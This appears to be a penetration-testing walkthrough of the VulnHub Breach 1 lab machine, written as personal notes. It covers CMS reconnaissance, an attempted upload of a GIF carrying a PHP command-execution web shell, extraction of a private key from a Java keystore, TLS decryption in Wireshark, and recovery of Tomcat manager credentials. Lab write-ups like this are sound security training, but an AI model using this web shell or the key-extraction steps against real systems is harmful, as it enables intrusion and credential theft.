# CMS
## ImpressCMS
- Finally from [[15 - Web Service]] we've got a CMS system, maybe our credential is for this
![[Pasted image 20210422131001.png]]
- And we do get in, it's time to play around the CMS.
![[Pasted image 20210422131048.png]]
- We have more names come out:
	- [Michael Bolton](http://192.168.110.140/impresscms/userinfo.php?uid=3)

### Mails
```
[ImpressCMS Admin](http://192.168.110.140/impresscms/userinfo.php?uid=1)  
![](http://192.168.110.140/impresscms/uploads/blank.gif)  

![](http://192.168.110.140/impresscms/images/subject/icon1.gif)  Sent: 2016/6/4 14:40:26

---

**FWD: Thank you for your purchase of Super Secret Cert Pro!**  
  
Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!
```
- Super Secret Cert: 192.168.110.140/.keystore

```
[Michael Bolton](http://192.168.110.140/impresscms/userinfo.php?uid=3)  
![](http://192.168.110.140/impresscms/uploads/blank.gif)  

![](http://192.168.110.140/impresscms/images/subject/icon1.gif)  Sent: 2016/6/6 19:25:18

---

**IDS/IPS system**  
  
Hey Peter,  
  
I got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie's last week!  
  
\-Michael
```
- a name called Peter. [Peter Gibbons]
```
Login Name   pgibbons
Display Name   Peter Gibbons
Email    peter.gibbons@initech.com
```

```
[ImpressCMS Admin](http://192.168.110.140/impresscms/userinfo.php?uid=1)  
![](http://192.168.110.140/impresscms/uploads/blank.gif)  

![](http://192.168.110.140/impresscms/images/subject/icon1.gif)  Sent: 2016/6/13 22:35:55

---

**Posting sensitive content**  
  
Peter, yeahhh, I'm going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that'd be great. -Bill
```
- a name called Bill, and he might be the CMS Admin role.
- Is there any sensitive artifacts NOT just in admin portal?

- Try to upload malicious image, but there's size limitation
```bash
┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ file evil.gif
evil.gif: GIF image data, version 89a, 2619 x 16188

┌──(htb㉿kali)-[~/VulnHub/Breach1]
└─$ cat evil.gif
GIF89a;
<?php system($_GET["cmd"]); ?>
```
![[Pasted image 20210422153523.png]]
- Nothing anymore around, but by clicking around, found that the content menu can be expanded
![[Pasted image 20210422155247.png]]
- Then there's a post:
	- http://192.168.110.140/impresscms/\_SSL\_test\_phase1.pcap
	- They told me the alias, storepassword and keypassword are all set to 'tomcat'. 
```
# SSL implementation test capture [![Edit](http://192.168.110.140/impresscms/images/kfaenza/actions/edit.png "Edit")](http://192.168.110.140/impresscms/modules/content/content.php?op=mod&content_id=1) [![Delete](http://192.168.110.140/impresscms/images/kfaenza/actions/editdelete.png "Delete")](http://192.168.110.140/impresscms/modules/content/content.php?op=del&content_id=1) 

Published by [Peter Gibbons](http://192.168.110.140/impresscms/modules/content/index.php?uid=2) on 2016/6/4 21:37:05. (0 reads)

Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. [](http://192.168.110.140/impresscms/_SSL_test_phase1.pcap)[http://192.168.110.140/impresscms/\_SSL\_test\_phase1.pcap](http://192.168.110.140/impresscms/_SSL_test_phase1.pcap) They told me the alias, storepassword and keypassword are all set to 'tomcat'. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.
```

- We had already know that the pcap is encrypted by some key, and we do have a java keystore
```bash
file keystore
keystore: Java KeyStore
```
- Here we learn how to extract the rsa key information from  this java keystore, and now we know why he mentioned about alias, storepassword and keypassword:
```bash
keytool -importkeystore -srckeystore keystore -srcstorepass tomcat -srckeypass tomcat -srcalias tomcat -destalia
s tomcat -destkeystore rsa.p12 -deststoretype PKCS12 -deststorepass tomcat -destkeypass tomcat
Importing keystore keystore to rsa.p12...
```

```bash
openssl pkcs12 -in rsa.p12 -nodes -nocerts -out rsa.pem
Enter Import Password: tomcat
```

```bash
cat rsa.pem
Bag Attributes
    friendlyName: tomcat
    localKeyID: 54 69 6D 65 20 31 36 31 39 30 37 31 38 33 38 39 34 33
Key Attributes: <No Attributes>
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
pHiPhbocjixKJz9xx+pG0jDkrg==
-----END PRIVATE KEY-----
```

- But even have no this key, we can still get from the pcap that our victim host is using port 8443 to talk to another PC box.
![[Pasted image 20210422162703.png]]

## Wireshark
- New things to learn, put rsa key into wireshark
![[Pasted image 20210422170920.png]]
- Then we will see TLS menu item from Follow menu, then we can see the decrypted content
![[Pasted image 20210422171551.png]]
- And there's one more base64 code
![[Pasted image 20210422172346.png]]
```bash
echo 'dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC' | base64 -d
tomcat:Tt\5D8F(#!*u=G)4m7zB
```
- And we now have the decrypted url: https://192.168.110.140:8443/_M@nag3Me/html

